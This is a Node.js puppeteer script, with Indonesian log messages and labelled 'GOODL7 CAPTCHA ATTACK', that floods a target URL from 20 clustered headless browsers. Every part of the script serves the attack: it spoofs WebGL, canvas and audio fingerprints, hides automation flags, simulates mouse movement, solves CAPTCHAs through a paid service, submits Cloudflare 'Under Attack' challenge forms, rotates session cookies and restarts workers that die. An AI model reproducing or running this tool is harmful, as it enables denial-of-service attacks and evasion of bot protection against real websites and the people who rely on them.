const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const { executablePath } = require('puppeteer');
const cluster = require('cluster');
const os = require('os');
puppeteer.use(StealthPlugin());
puppeteer.use(RecaptchaPlugin({
    provider: {
        id: '2captcha',
        token: '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe' // Ganti dengan API key real
    },
    visualFeedback: true
}));

const TARGET_URL = '';
const CONCURRENT_BROWSERS = 20;
const REQUESTS_PER_BROWSER = 1000;
const DELAY_MIN = 100;
const DELAY_MAX = 3000;

const FINGERPRINT_CONFIGS = [
    {
        viewport: { width: 1920, height: 1080 },
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        platform: 'Win32',
        languages: ['en-US', 'en'],
        timezone: 'America/New_York',
        geolocation: { latitude: 40.7128, longitude: -74.0060 }
    },
    {
        viewport: { width: 1366, height: 768 },
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        platform: 'MacIntel',
        languages: ['en-GB', 'en'],
        timezone: 'Europe/London',
        geolocation: { latitude: 51.5074, longitude: -0.1278 }
    }
];

async function modifyWebGLFingerprint(page) {
    await page.evaluateOnNewDocument(() => {
        
        const getParameterProxy = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) {
                return 'Intel Inc.';
            }
            if (parameter === 37446) {
                return 'Intel Iris OpenGL Engine';
            }
            return getParameterProxy.call(this, parameter);
        };
      
        const toDataURL = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function(type, encoderOptions) {
            const context = this.getContext('2d');
            if (context) {
                
                context.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.01)`;
                context.fillRect(0, 0, 1, 1);
            }
            return toDataURL.call(this, type, encoderOptions);
        };

        const audioContext = window.AudioContext || window.webkitAudioContext;
        if (audioContext) {
            const originalCreate = audioContext.prototype.createOscillator;
            audioContext.prototype.createOscillator = function() {
                const oscillator = originalCreate.apply(this, arguments);
                const originalFrequency = oscillator.frequency;
                Object.defineProperty(oscillator.frequency, 'value', {
                    get: () => 440.01 + Math.random() * 0.02
                });
                return oscillator;
            };
        }
    });
}

async function simulateHumanBehavior(page) {
    await page.evaluate(async () => {
        
        const movements = [
            { x: 100, y: 200 },
            { x: 300, y: 150 },
            { x: 250, y: 300 },
            { x: 400, y: 250 }
        ];

        for (const movement of movements) {
            await new Promise(resolve => {
                setTimeout(() => {
                    const event = new MouseEvent('mousemove', {
                        clientX: movement.x,
                        clientY: movement.y,
                        bubbles: true
                    });
                    document.dispatchEvent(event);
                    resolve();
                }, 100 + Math.random() * 200);
            });
        }

        window.scrollTo({
            top: Math.random() * 1000,
            behavior: 'smooth'
        });
    });
}

async function bypassUAM(page) {
    try {
        await page.waitForSelector('#challenge-form', { timeout: 10000 })
            .catch(() => null);

        await page.solveRecaptchas();

        await page.evaluate(() => {
            const challengeForm = document.querySelector('#challenge-form');
            if (challengeForm) {
            
                setTimeout(() => {
                    challengeForm.submit();
                }, 1500 + Math.random() * 2000);
            }
        });

        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 })
            .catch(() => null);

        return true;
    } catch (error) {
        await page.reload({ waitUntil: 'networkidle0' });
        return false;
    }
}

async function launchUAMBypassAttack() {
    const fingerprint = FINGERPRINT_CONFIGS[Math.floor(Math.random() * FINGERPRINT_CONFIGS.length)];
    
    const browser = await puppeteer.launch({
        headless: 'new',
        executablePath: executablePath(),
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-blink-features=AutomationControlled',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--disable-gpu',
            `--window-size=${fingerprint.viewport.width},${fingerprint.viewport.height}`,
            '--disable-webgl',
            '--disable-popup-blocking',
            '--disable-notifications',
            '--lang=en-US,en;q=0.9'
        ]
    });

    const context = await browser.createIncognitoBrowserContext();
    const page = await context.newPage();

    await page.setViewport(fingerprint.viewport);
    await page.setUserAgent(fingerprint.userAgent);
    await page.setExtraHTTPHeaders({
        'Accept-Language': fingerprint.languages.join(','),
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    });

    await modifyWebGLFingerprint(page);

    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        window.chrome = { runtime: {} };
    });

    let successCount = 0;
    
    for (let i = 0; i < REQUESTS_PER_BROWSER; i++) {
        try {
            await page.goto(TARGET_URL, {
                waitUntil: 'networkidle2',
                timeout: 30000
            });

            const pageContent = await page.content();
            if (pageContent.includes('Checking your browser') || 
                pageContent.includes('cloudflare') || 
                pageContent.includes('challenge')) {
                
                console.log(`[!] CaptCha terdeteksi, mencoba bypass...`);
                const bypassed = await bypassUAM(page);
                
                if (!bypassed) {
                    console.log(`[X] Bypass gagal, restart browser...`);
                    await browser.close();
                    return launchUAMBypassAttack();
                }
            }


            await simulateHumanBehavior(page);

            await page.evaluate(() => {
                fetch('/api/data', {
                    method: 'GET',
                    headers: {
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    credentials: 'include'
                }).catch(() => {});
            });
            successCount++;
            console.log(`[✓] Request ${i+1} berhasil, total: ${successCount}`);

            await page.waitForTimeout(DELAY_MIN + Math.random() * (DELAY_MAX - DELAY_MIN));

            if (i % 10 === 0) {
                await context.clearCookies();
                await page.setCookie({
                    name: 'session',
                    value: Math.random().toString(36).substring(2),
                    domain: new URL(TARGET_URL).hostname
                });
            }

        } catch (error) {
            console.log(`[!] Error: ${error.message}`);
        }
    }

    await browser.close();
    return successCount;
}

if (cluster.isMaster) {
    console.log(`[GOODL7] CAPTCHA ATTACK SUCCESFULY`);
    console.log(`[!] Target: ${TARGET_URL}`);
    console.log(`[!] Concurrent browsers: ${CONCURRENT_BROWSERS}`);
    
    for (let i = 0; i < CONCURRENT_BROWSERS; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        console.log(`[!] Worker ${worker.process.pid} mati, restarting...`);
        cluster.fork();
    });
} else {
    launchUAMBypassAttack().then(count => {
        console.log(`[✓] Worker selesai dengan ${count} successful requests`);
        process.exit(0);
    }).catch(err => {
        console.log(`[X] Worker error: ${err.message}`);
        process.exit(1);
    });
}

process.on('uncaughtException', () => {
    cluster.fork();
});